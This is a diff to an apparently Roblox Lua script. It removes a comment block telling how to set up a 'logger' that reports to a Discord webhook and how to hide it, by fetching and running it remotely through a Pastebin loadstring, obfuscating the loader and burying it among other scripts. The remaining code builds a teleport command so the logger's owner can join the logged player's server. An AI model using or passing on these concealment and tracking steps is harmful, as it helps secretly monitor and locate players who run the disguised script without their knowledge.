@@ -1,28 +1,3 @@
---[[
-How to use: 
-
-First make a discord Server and make a webhook, paste the webhook into the spot that says "Webhook goes here"
-And thats literally how to make the script work
-
-How to hide it: 
-
-Start off by doing the how to use steps
-After ur done with that put the script u made into a pastebin and turn that into a loadstring
-u can use this template
-
-loadstring(game:HttpGet("ur-pastebin-here", true))()
-
-After that put the loadstring into a text file and use a lua obfuscator of choise, if u just want a free bad one use "https://luaobfuscator.com"
-
-After u have obfuscated the file u can either send the obfuscated loadstring or u can put it into another pastebin and make that a loadstring
-
-Why obfuscate the loadstring?
-the script breaks if u obfuscate the script itself, thats why u have to use a loadstring
-
-you can also include other scripts below or above the logger so that u can hide it better
-
-]]--
-
 local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
 print(helo) --line above generates a script that allows u to join the logged user
 
